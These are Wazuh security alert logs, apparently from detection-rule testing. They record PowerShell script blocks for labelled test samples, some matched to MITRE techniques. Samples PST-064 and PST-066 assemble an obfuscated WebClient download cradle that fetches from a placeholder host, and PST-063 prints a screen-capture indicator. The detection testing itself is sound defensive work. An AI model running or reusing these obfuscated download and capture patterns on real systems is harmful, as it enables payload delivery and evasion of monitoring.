{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"69313e31-30a7-4654-8287-a75ffaa8b501","scriptBlockText":"$sampleId='PST-063'; $indicator='[System.Dra`wing.Graphics]::Fro`mImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721834","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-063'; $indicator='[System.Dra`wing.Graphics]::Fro`mImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)'; Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 69313e31-30a7-4654-8287-a75ffaa8b501\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:55.8258715Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:55.8258715Z\",\"eventRecordID\":\"721834\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-063'; $indicator='[System.Dra`wing.Graphics]::Fro`mImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)'; Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 69313e31-30a7-4654-8287-a75ffaa8b501\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-063'; $indicator='[System.Dra`wing.Graphics]::Fro`mImage($bmp).CopyFromScreen(0,0,0,0,$bmp.Size)'; Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"69313e31-30a7-4654-8287-a75ffaa8b501\"}}}","id":"1784280956.433100","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Screen capture method invoked from PowerShell script.","firedtimes":1,"groups":["windows"," powershell"],"id":"91803","level":14,"mail":true,"mitre":{"id":["T1113"],"tactic":["Collection"],"technique":["Screen Capture"]}},"timestamp":"2026-07-17T11:35:56.760+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"b4818898-e894-475f-861f-89fca4888719","scriptBlockText":"$sampleId='PST-064'; $parts=@('$wc=New-Obj','ect Net.Web','Client; $wc.','Proxy=[Net.','WebRequest]::Defa','ultWebProxy; ','$wc.Headers[''Use','r-Agent'']=''Mo','zilla/5.0''; $wc.','DownloadString(''','https://cdn.','example.invalid/','a'')'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721837","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-064'; $parts=@('$wc=New-Obj','ect Net.Web','Client; $wc.','Proxy=[Net.','WebRequest]::Defa','ultWebProxy; ','$wc.Headers[''Use','r-Agent'']=''Mo','zilla/5.0''; $wc.','DownloadString(''','https://cdn.','example.invalid/','a'')'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: b4818898-e894-475f-861f-89fca4888719\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:56.1510661Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:56.1510661Z\",\"eventRecordID\":\"721837\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-064'; $parts=@('$wc=New-Obj','ect Net.Web','Client; $wc.','Proxy=[Net.','WebRequest]::Defa','ultWebProxy; ','$wc.Headers[''Use','r-Agent'']=''Mo','zilla/5.0''; $wc.','DownloadString(''','https://cdn.','example.invalid/','a'')'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: b4818898-e894-475f-861f-89fca4888719\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-064'; $parts=@('$wc=New-Obj','ect Net.Web','Client; $wc.','Proxy=[Net.','WebRequest]::Defa','ultWebProxy; ','$wc.Headers[''Use','r-Agent'']=''Mo','zilla/5.0''; $wc.','DownloadString(''','https://cdn.','example.invalid/','a'')'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"b4818898-e894-475f-861f-89fca4888719\"}}}","id":"1784280956.433100","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:56.767+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"86182632-8e8e-474a-adfe-e10b64a53d25","scriptBlockText":"$sampleId='PST-065'; Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 3 -ErrorAction SilentlyContinue | Select-Object Id,TimeCreated; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721840","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-065'; Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 3 -ErrorAction SilentlyContinue | Select-Object Id,TimeCreated; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 86182632-8e8e-474a-adfe-e10b64a53d25\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:56.5038713Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:56.5038713Z\",\"eventRecordID\":\"721840\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-065'; Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 3 -ErrorAction SilentlyContinue | Select-Object Id,TimeCreated; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 86182632-8e8e-474a-adfe-e10b64a53d25\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-065'; Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 3 -ErrorAction SilentlyContinue | Select-Object Id,TimeCreated; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"86182632-8e8e-474a-adfe-e10b64a53d25\"}}}","id":"1784280956.433100","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:56.798+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"8e06ab11-0d79-4a20-bac0-76c482b186e4","scriptBlockText":"$sampleId='PST-066'; $parts=@('$wC=NEW-OBJEct',' NeT.weBCliENT; $','wC.proxy=[nET','.webREqUEST]','::dEFAult`w','`EBprOXy; $w','c.heAdErs[''uS','Er-AGent'']=''mo','zIl`LA/5.0''; $wC.d','owNlO`a`dStRING(''h','tTPs://cDN.ex','AMplE.INv`alID/a'')'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721854","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-066'; $parts=@('$wC=NEW-OBJEct',' NeT.weBCliENT; $','wC.proxy=[nET','.webREqUEST]','::dEFAult`w','`EBprOXy; $w','c.heAdErs[''uS','Er-AGent'']=''mo','zIl`LA/5.0''; $wC.d','owNlO`a`dStRING(''h','tTPs://cDN.ex','AMplE.INv`alID/a'')'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 8e06ab11-0d79-4a20-bac0-76c482b186e4\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:56.9059797Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:56.9059797Z\",\"eventRecordID\":\"721854\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-066'; $parts=@('$wC=NEW-OBJEct',' NeT.weBCliENT; $','wC.proxy=[nET','.webREqUEST]','::dEFAult`w','`EBprOXy; $w','c.heAdErs[''uS','Er-AGent'']=''mo','zIl`LA/5.0''; $wC.d','owNlO`a`dStRING(''h','tTPs://cDN.ex','AMplE.INv`alID/a'')'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 8e06ab11-0d79-4a20-bac0-76c482b186e4\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-066'; $parts=@('$wC=NEW-OBJEct',' NeT.weBCliENT; $','wC.proxy=[nET','.webREqUEST]','::dEFAult`w','`EBprOXy; $w','c.heAdErs[''uS','Er-AGent'']=''mo','zIl`LA/5.0''; $wC.d','owNlO`a`dStRING(''h','tTPs://cDN.ex','AMplE.INv`alID/a'')'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"8e06ab11-0d79-4a20-bac0-76c482b186e4\"}}}","id":"1784280957.433100","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:57.855+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"5be7130c-353e-410a-8dbd-759c68bc8b56","scriptBlockText":"$sampleId='PST-067'; $p = ('C:' + '\\\\ProgramData' + '\\\\Reports' + '\\\\inventory.json'); Write-Output $p; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721857","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-067'; $p = ('C:' + '\\ProgramData' + '\\Reports' + '\\inventory.json'); Write-Output $p; Write-Output 'hard benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 5be7130c-353e-410a-8dbd-759c68bc8b56\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:57.2289760Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:57.2289760Z\",\"eventRecordID\":\"721857\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-067'; $p = ('C:' + '\\\\ProgramData' + '\\\\Reports' + '\\\\inventory.json'); Write-Output $p; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 5be7130c-353e-410a-8dbd-759c68bc8b56\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-067'; $p = ('C:' + '\\\\\\\\ProgramData' + '\\\\\\\\Reports' + '\\\\\\\\inventory.json'); Write-Output $p; Write-Output 'hard benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"5be7130c-353e-410a-8dbd-759c68bc8b56\"}}}","id":"1784280957.433100","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:57.861+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"6262c777-65d4-48e4-b9ff-d20e723e6c22","scriptBlockText":"$sampleId='PST-068'; $cfg = 'path=C:\\\\Temp;mode=audit;owner=admin;enabled=true;retry=3;hash=AA11-BB22-CC33'; Write-Output $cfg; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721860","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-068'; $cfg = 'path=C:\\Temp;mode=audit;owner=admin;enabled=true;retry=3;hash=AA11-BB22-CC33'; Write-Output $cfg; Write-Output 'hard benign variant 2'; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 6262c777-65d4-48e4-b9ff-d20e723e6c22\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:57.5544627Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:57.5544627Z\",\"eventRecordID\":\"721860\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-068'; $cfg = 'path=C:\\\\Temp;mode=audit;owner=admin;enabled=true;retry=3;hash=AA11-BB22-CC33'; Write-Output $cfg; Write-Output 'hard benign variant 2'; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 6262c777-65d4-48e4-b9ff-d20e723e6c22\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-068'; $cfg = 'path=C:\\\\\\\\Temp;mode=audit;owner=admin;enabled=true;retry=3;hash=AA11-BB22-CC33'; Write-Output $cfg; Write-Output 'hard benign variant 2'; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"6262c777-65d4-48e4-b9ff-d20e723e6c22\"}}}","id":"1784280957.433100","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:57.867+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"55afd688-8696-4197-b564-df0a22a9ac0d","scriptBlockText":"$sampleId='PST-069'; Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue | Select-Object -First 5 Name; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721875","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-069'; Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue | Select-Object -First 5 Name; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 55afd688-8696-4197-b564-df0a22a9ac0d\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:57.8966081Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:57.8966081Z\",\"eventRecordID\":\"721875\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-069'; Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue | Select-Object -First 5 Name; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 55afd688-8696-4197-b564-df0a22a9ac0d\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-069'; Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue | Select-Object -First 5 Name; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"55afd688-8696-4197-b564-df0a22a9ac0d\"}}}","id":"1784280958.433100","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script querying system environment variables","firedtimes":9,"groups":["windows"," powershell"],"id":"91816","level":4,"mail":false,"mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]}},"timestamp":"2026-07-17T11:35:58.921+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"1cc30005-adda-41d4-869a-62446b44e33f","scriptBlockText":"$sampleId='PST-070'; Get-ItemProperty -Path 'HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion' | Select-Object ProductName, ReleaseId; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721878","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-070'; Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' | Select-Object ProductName, ReleaseId; Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: 1cc30005-adda-41d4-869a-62446b44e33f\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:58.2373185Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:58.2373185Z\",\"eventRecordID\":\"721878\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-070'; Get-ItemProperty -Path 'HKLM:\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion' | Select-Object ProductName, ReleaseId; Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: 1cc30005-adda-41d4-869a-62446b44e33f\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-070'; Get-ItemProperty -Path 'HKLM:\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion' | Select-Object ProductName, ReleaseId; Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"1cc30005-adda-41d4-869a-62446b44e33f\"}}}","id":"1784280958.435505","location":"EventChannel","manager":{"name":"MSI"},"timestamp":"2026-07-17T11:35:58.928+0200"}
{"agent":{"id":"001","ip":"172.28.192.1","name":"Windows-Host"},"data":{"win":{"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockId":"f11af174-45f7-416f-a7ae-bf7cb44e9d54","scriptBlockText":"$sampleId='PST-071'; $b = 'aW52ZW50b3J5LW5vdGU='; [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)"},"system":{"channel":"Microsoft-Windows-PowerShell/Operational","computer":"MSI","eventID":"4104","eventRecordID":"721879","keywords":"0x0","level":"5","message":"\"Creating Scriptblock text (1 of 1):\r\n$sampleId='PST-071'; $b = 'aW52ZW50b3J5LW5vdGU='; [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); Write-Output (\"WAZUH_SAMPLE {0}\" -f $sampleId)\r\n\r\nScriptBlock ID: f11af174-45f7-416f-a7ae-bf7cb44e9d54\r\nPath: \"","opcode":"15","processID":"23324","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","providerName":"Microsoft-Windows-PowerShell","severityValue":"VERBOSE","systemTime":"2026-07-17T09:35:58.5811492Z","task":"2","threadID":"21688","version":"1"}}},"decoder":{"name":"windows_eventchannel"},"full_log":"{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-PowerShell\",\"providerGuid\":\"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}\",\"eventID\":\"4104\",\"version\":\"1\",\"level\":\"5\",\"task\":\"2\",\"opcode\":\"15\",\"keywords\":\"0x0\",\"systemTime\":\"2026-07-17T09:35:58.5811492Z\",\"eventRecordID\":\"721879\",\"processID\":\"23324\",\"threadID\":\"21688\",\"channel\":\"Microsoft-Windows-PowerShell/Operational\",\"computer\":\"MSI\",\"severityValue\":\"VERBOSE\",\"message\":\"\\\"Creating Scriptblock text (1 of 1):\\r\\n$sampleId='PST-071'; $b = 'aW52ZW50b3J5LW5vdGU='; [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); Write-Output (\\\"WAZUH_SAMPLE {0}\\\" -f $sampleId)\\r\\n\\r\\nScriptBlock ID: f11af174-45f7-416f-a7ae-bf7cb44e9d54\\r\\nPath: \\\"\"},\"eventdata\":{\"messageNumber\":\"1\",\"messageTotal\":\"1\",\"scriptBlockText\":\"$sampleId='PST-071'; $b = 'aW52ZW50b3J5LW5vdGU='; [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)); Write-Output (\\\\\\\"WAZUH_SAMPLE {0}\\\\\\\" -f $sampleId)\",\"scriptBlockId\":\"f11af174-45f7-416f-a7ae-bf7cb44e9d54\"}}}","id":"1784280958.435505","location":"EventChannel","manager":{"name":"MSI"},"rule":{"description":"Powershell script may be using Base64 decoding method","firedtimes":8,"groups":["windows"," powershell"],"id":"91809","level":10,"mail":false,"mitre":{"id":["T1140"],"tactic":["Defense Evasion"],"technique":["Deobfuscate/Decode Files or Information"]}},"timestamp":"2026-07-17T11:35:58.931+0200"}
